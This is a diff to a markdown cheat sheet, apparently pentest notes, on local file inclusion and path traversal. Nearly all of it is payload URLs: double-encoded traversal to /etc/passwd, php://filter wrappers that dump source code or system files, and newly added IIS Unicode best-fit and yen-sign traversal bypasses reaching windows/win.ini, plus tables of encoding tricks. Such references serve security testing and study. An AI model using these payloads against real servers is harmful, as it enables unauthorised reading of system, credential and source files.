@@ -24,18 +24,26 @@ http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%2500 http://exam
 //Wrappers 
 http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php http://example.com/index.php?page=php%3A%2F%2Ffilter%2Fconvert%2Ebase64%2Dencode%2Fresource%3Dindex%2Ephp 
 
+//IIS server with 
+/// best fit 
+	/cgi.pl/%E0dmin   -> /cgi.pl/admin 
+
+	////`doc_root` directive configured
+		/index.php/..¥..¥..¥windows/win.ini/
+		/index.php/..¥..¥NONEXIST/
 Can be chained with a compression wrapper. http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
 ```
 
 ##### bypass path traversal 
 | char | url encoding | 16-bit unicode |
-| ---- | ---- | ---- |
-| . | %2e | %u002e |
-| / | %2f | %u2215 |
-| \ | %5c | %u2216 |
+| ---- | ------------ | -------------- |
+| .    | %2e          | %u002e         |
+| /    | %2f          | %u2215         |
+| \    | %5c          | %u2216         |
+| /    | ¥            | U+00A5         |
 
-|../|`..\` |
-|---|---|
-|%2e%2e%2f|%2e%2e%5c|
-|`%2e%2e/ \|\| ..%2f` |`%2e%2e\ \|\| ..%5c` |
-|..%255c|%252e%252e%255c|
+| ../                  | `..\`                |
+| -------------------- | -------------------- |
+| %2e%2e%2f            | %2e%2e%5c            |
+| `%2e%2e/ \|\| ..%2f` | `%2e%2e\ \|\| ..%5c` |
+| ..%255c              | %252e%252e%255c      |
